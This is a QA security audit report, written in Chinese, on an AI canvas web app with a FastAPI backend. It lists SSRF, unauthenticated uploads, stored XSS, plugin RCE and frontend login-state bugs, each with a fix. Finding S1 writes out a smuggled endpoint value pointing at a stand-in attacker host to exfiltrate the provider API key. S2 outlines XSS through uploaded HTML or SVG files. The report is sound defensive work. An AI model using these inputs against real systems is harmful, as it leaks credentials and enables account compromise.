# Infinite Canvas（前后端）测试报告

> 测试角色：测试工程师（QA）
> 测试对象：`infinite-canvas-main/web`（前端 Vite+React） + `infinite-canvas-backend`（FastAPI 后端）
> 测试方式：代码静态审查 + 关键路径动态验证（后端 8081 在跑，`/uploads` 静态挂载已实测可免鉴权访问）
> 测试日期：2026-07-30

---

## 一、测试结论概览

| 类别 | 严重 | 高 | 中 | 低 |
|------|------|----|----|----|
| 安全隐患 | 2 | 4 | 6 | 1 |
| 重大 Bug | 1 | 3 | 2 | 0 |
| UX 体验问题 | 0 | 3 | 6 | 3 |

**总评**：项目处于开发早期，核心多用户框架已搭起来，但**安全基线很不扎实**（密钥默认值、DEBUG 默认开、上传越权、SSRF、Cookie 不 secure），且**前端登录态/401 处理有功能性缺陷**（刷新 token 是死代码、无静默续期、admin 未拦截未登录）。上线前必须至少修复全部"严重/高"项。

---

## 二、安全隐患（按严重级别）

### 🔴 严重 / Critical

#### S1. SSRF + 供应商 API Key 泄露（任何登录用户可触发）
- **位置**：`app/api/gateway/router.py:171` `/gateway/{variable_name}/proxy`；`app/services/gateway_service.py:17` `_build_upstream_url`
- **问题**：proxy 接口接收用户传入的 `endpoint`，直接拼到 `source.base_url` 后面：
  ```python
  url = source.base_url.rstrip("/") + (endpoint if endpoint.startswith("/") else "/" + endpoint)
  ```
  `endpoint` 未做任何校验。攻击者传入 `endpoint = "foo@attacker.com/x"`，最终 URL 被解析为向 `attacker.com` 发起请求；而 `gateway_service.py:30-33` 仍会带上 `Authorization: Bearer <供应商真实 api_key>`。
  **后果**：后端把供应商密钥发到攻击者服务器（凭据外泄），同时是标准 SSRF（可探测内网，若 `base_url` 被管理员配成内网地址危害更大）。
- **触发条件**：任意已登录普通用户（该路由只要求 `get_current_user`，非 admin）。
- **修复**：endpoint 必须限制为"纯路径"（正则 `^/[a-zA-Z0-9_./-]*$`，禁止 `@`、`:`、`//`、scheme）；或干脆只允许管理员调用 proxy；调用前用 `urlparse` 校验 host 与 `source.base_url` 一致。

#### S2. 上传文件免鉴权公开访问 + 存储型 XSS
- **位置**：`main.py:37` `app.mount("/uploads", StaticFiles(directory=settings.UPLOAD_DIR))`（无鉴权依赖）；`app/api/upload/router.py:27` 上传不做文件类型校验
- **动态验证**：`curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/uploads/{uid}/{file}` 返回 **200**（未带任何 token/ cookie）。
- **问题**：
  1. **越权读取**：所有上传文件（含用户私有工程导出、图片）通过 `/uploads/{user_id}/{filename}` 可被任意知道 UUID 文件名者读取，无认证。
  2. **存储型 XSS**：前端 `upload` 接口接受任意扩展名，`StaticFiles` 按扩展名设置 content-type。上传 `evil.html`/`evil.svg` 后访问该 URL，浏览器以 `text/html` / `image/svg+xml` 内联渲染，脚本执行 → 持久化 XSS。
- **修复**：
  - 移除 `/uploads` 公开静态挂载，统一走 `GET /api/v1/upload/{user_id}/{filename}`（已带鉴权）；
  - 上传时校验 MIME/扩展名白名单（仅图片/视频/音频）；
  - 返回文件时强制 `Content-Disposition: attachment` 并对 HTML/SVG 拒绝内联渲染（或 `Content-Security-Policy: sandbox`）。

### 🟠 高 / High

#### S3. DEBUG=True 默认开启，错误堆栈透传前端
- **位置**：`app/core/config.py:8` `DEBUG: bool = True`；`main.py:16` `debug=settings.DEBUG`；前端 `image.ts/video.ts/audio.ts/webdav-sync.ts` 直接展示 `detail`
- **问题**：未捕获异常时 FastAPI 把完整 traceback、SQL、绝对路径写入 HTTP `detail`，前端又原样展示给用户。
- **修复**：生产 `DEBUG=false`；全局异常处理器只返回通用错误 ID；前端只展示友好文案，不展示原始 `detail`。

#### S4. 认证 Cookie `secure=False`
- **位置**：`app/api/auth/router.py:26,34`
- **问题**：`access_token`/`refresh_token` 为 `HttpOnly+SameSite=Lax` 但 `secure=False`，HTTPS 下仍可被明文/中间人截获会话。
- **修复**：生产 `secure=True`（配合 HTTPS）。

#### S5. 插件后台执行 = 服务端 RCE（信任边界过宽）
- **位置**：`app/api/admin/router.py:167` `execute_plugin_endpoint`（任意登录用户可调）；`app/services/plugin_service.py:42` `exec(user_code, _globals)`
- **问题**：`/admin/plugins/{id}/execute` 仅要求登录，脚本内容由管理员写入，通过 `subprocess` 执行。虽用 builtins 白名单，但子进程无沙箱、可联网、可读写服务器文件。**管理员账户一旦被盗 = 服务器被控。**
- **修复**：插件执行改为仅在隔离沙箱（gVisor/Firecracker）运行；限制网络出口；执行权限收到 `require_admin`；脚本内容做哈希签名校验。

#### S6. 前端插件从任意 URL 加载并执行 JS
- **位置**：`web/src/lib/canvas/plugin-loader.ts:47-68` `installPluginFromUrl` / `evaluatePluginSource`
- **问题**：对任意 `url` `fetch` 后用 `import()` 动态执行脚本，仅校验 `id/nodes` 结构，`official` 标记无后端签名校验。诱导安装恶意插件 URL 即在已认证会话中运行任意 JS（持久化 XSS）。
- **修复**：插件来源白名单 + 后端签名/哈希校验；禁止运行时从任意 URL 拉取执行。

### 🟡 中 / Medium

#### S7. 登录无频率限制 / 锁定 / 验证码，弱密码可被撞库
- **位置**：`app/api/auth/router.py:69` `/login`
- **问题**：后端仅 `password` 校验 `min_length=6`（schema 已约束），无失败计数、无验证码、无锁定。可被暴力破解。
- **修复**：加 Redis 限流（如 5 次/10 分钟锁 15 分钟）；可选验证码。

#### S8. Refresh Token 不失效、不校验账号状态
- **位置**：`app/api/auth/router.py:82` `/refresh`
- **问题**：refresh 仅 `decode_token` 不查库、不校验 `status`；刷新不撤销旧 token（无 jti/版本）。被盗 refresh 在 7 天内始终可用；封禁用户 refresh 仍可用。
- **修复**：refresh 时校验 `User.status=="active"`；引入 token 版本/黑名单，刷新即作废旧 token。

#### S9. CORS methods/headers 全开 + credentials
- **位置**：`main.py:21-24`
- **问题**：`allow_methods/headers=["*"]` 且 `allow_credentials=True`，完全依赖 `CORS_ORIGINS` 白名单。一旦部署把 origins 配宽，凭据 cookie 可被任意前端跨域读取。
- **修复**：methods/headers 收敛为实际所需；origins 严格白名单（生产绝不带 `*`）。

#### S10. 前端 localStorage 明文存敏感凭据
- **位置**：`web/src/stores/use-config-store.ts`（apiKey、WebDAV password）、`use-agent-store.ts`（canvas-agent-token）
- **问题**：XSS 即可读取这些明文凭据并外传。
- **修复**：WebDAV 密码用 `crypto.subtle` 经用户口令派生密钥加密后再存；agent token 缩短有效期且不持久化；apiKey 尽量仅存内存。

#### S11. 用户输入长度/类型校验缺失
- **位置**：`web/src/services/api/backend.ts:136` `createProject` 无 name 长度限制；prompt/文件名无长度校验
- **问题**：超长 `canvas_data`/工程名造成存储膨胀或后端报错。
- **修复**：前后端均加长度上限。

#### S12. 网关流式分支未退款
- **位置**：`app/api/gateway/router.py:74-94`
- **问题**：流式返回 `StreamingResponse` 后，try/except 只包住 `call_upstream` 不包生成器；流式中途失败已扣积分且不退款、错误也无法以 HTTP 返回。
- **修复**：流式错误在生成器内捕获并退款/记录日志。

### 🟢 低 / Low

#### S13. 调用日志记录完整 request_body（含用户 prompt）
- **位置**：`gateway_service.py:log_call` 存 `request_body`
- **问题**：admin 可见所有用户原始 prompt，存在隐私顾虑。
- **修复**：按需脱敏或仅存摘要。

---

## 三、重大 Bug（功能 / 数据）

### B1. [严重] 上传文件越权读取（见 S2）—— 数据泄露 bug

### B2. [高] admin 未拦截未登录用户
- **位置**：`web/src/pages/admin/index.tsx:41-46`
- **问题**：守卫条件 `if (currentUser && currentUser.role !== "admin")` —— 当 `currentUser === null`（未登录）时条件为假，**不跳转**。未登录者可直接打开 `/admin` 看到完整后台 UI，随后各表格报 401。
- **修复**：改为 `if (!currentUser) { navigate("/login"); return; } if (currentUser.role !== "admin") { ... }`。

### B3. [高] 401 事件无人监听 + 刷新 token 是死代码
- **位置**：`web/src/services/api/backend.ts:16` `dispatchEvent("ic:auth:required")`；`web/src/stores/use-user-store.ts` `refreshSession` 从未调用 `refreshToken()`
- **问题**：后端 401 时前端派发事件但全仓无 `addEventListener`；`refreshToken()` 函数定义后从未被调用。结果：15 分钟 access token 过期后，用户前端仍显示"已登录"，但每个 API 都 401，所有操作只弹笼统错误，**不跳登录、无静默续期** → 用户"点什么都失败"。
- **修复**：要么实现 `backend.ts` 的 401 拦截自动调用 `/auth/refresh` 重试，刷新失败再跳登录；要么在 `refreshSession` 里真正调用 `refreshToken()` 并监听 `ic:auth:required`。

### B4. [高] 积分不足(402)/500 无友好提示与引导充值
- **位置**：`web/src/pages/canvas/project.tsx:2237,1747`（显示原始 axios 错误）；前端无充值入口
- **问题**：余额耗尽时显示 `"Request failed with status code 402"`，且不提供任何"去充值"引导。更严重的是**前端根本没有用户自助充值 UI**（仅 admin 能在后台加积分），普通用户余额归零即卡死。
- **修复**：识别 402 弹"积分不足，请联系管理员/去充值"；至少提供"联系管理员"入口或充值页。

### B5. [中] 路由级守卫缺失
- **位置**：`web/src/router.tsx:18-41`
- **问题**：无 `RequireAuth` 守卫，未登录用户可进入 `/canvas` 等页触发 401 后才暴露。
- **修复**：加路由守卫，未登录统一跳 `/login`。

### B6. [中] 注册积分双重写入（非致命）
- **位置**：`app/api/auth/router.py:50`
- **问题**：`User(credits=0)` 再 `add_credits(DEFAULT_SIGNUP_CREDITS)`，两次写库。虽结果正确（=100），但冗余；若 `add_credits` 失败则用户 0 积分。
- **修复**：直接 `credits=settings.DEFAULT_SIGNUP_CREDITS`。

---

## 四、UX 体验问题

| 级别 | 问题 | 位置 |
|------|------|------|
| 高 | 401 无监听 + 无静默刷新（见 B3） | backend.ts:16 / use-user-store |
| 高 | /admin 未拦截未登录（见 B2） | admin/index.tsx:41 |
| 高 | 积分不足无友好提示与引导充值（见 B4） | project.tsx:2237 |
| 中 | 路由级守卫缺失（见 B5） | router.tsx |
| 中 | 进入具体画布隐藏顶栏（含退出登录/用户菜单），用户"困"在页内 | app-top-nav.tsx:27 |
| 中 | 导出失败仅 `console.error`，用户无法自查 | project.tsx:1000 |
| 中 | admin 用原生 `window.prompt`/`confirm`，风格不一致、移动端差 | admin/index.tsx:387,404 |
| 中 | admin 删除模型/变量无二次确认，易误删 | admin/index.tsx:139,304 |
| 中 | 调用日志无服务端分页，固定 `limit:100`，>100 条不可见 | admin/index.tsx:452 |
| 低 | 登录框无自动聚焦、无密码强度/长度提示（与注册端 min:6 不一致） | login/index.tsx:35,37 |
| 低 | 首页 showcase 无 skeleton/spinner，数据返回前空白 | home/index.tsx:77 |
| 低 | admin/assets 弹窗固定宽（720/980），移动端易溢出 | admin/index.tsx:181 |

**UX 重点建议**：
1. 先把"登录态续期"和"积分/错误友好提示"修了，否则创意类长会话用户会频繁卡死。
2. 顶栏在画布页保留"退出登录/用户菜单"入口，避免无法返回。
3. admin 操作统一用 antd `Modal.confirm` 并加服务端分页。

---

## 五、修复优先级建议

**P0（上线前必须修）**
1. S2 上传越权 + 存储型 XSS（移除公开静态挂载 + 类型白名单）
2. S1 proxy SSRF（endpoint 路径校验）
3. S3 DEBUG 关闭 + 全局异常处理
4. B2/B3 登录态守卫与刷新（否则功能不可用）

**P1（上线前尽量修）**
5. S4 Cookie secure=True
6. S7 登录限流
7. S8 refresh 失效/状态校验
8. B4 402 友好提示 + 充值入口
9. S5/S6 插件执行沙箱与签名

**P2（迭代优化）**
10. S9 CORS 收敛；S10 localStorage 加密；S11/S12 输入校验与流式退款；S13 日志脱敏
11. UX 中低项（守卫、顶栏、弹窗、分页、聚焦、skeleton）

---

## 六、已确认的良好实践（保留）
- JWT access/refresh 走 HttpOnly Cookie，非 localStorage（优于常见方案）。
- 积分扣减用原子 SQL `UPDATE ... WHERE credits >= :amount`（无负余额竞态）。
- 后端 api_key 用 Fernet 加密存储，`ApiSourceOut` 不返回明文 key。
- 工程/资产按 `user_id` 做归属隔离（projects/router.py、assets/router.py 均带 `Project.user_id == current_user.id`）。
- 后端 `require_admin` 强制校验，前端 role 仅做 UX 隐藏（可接受）。
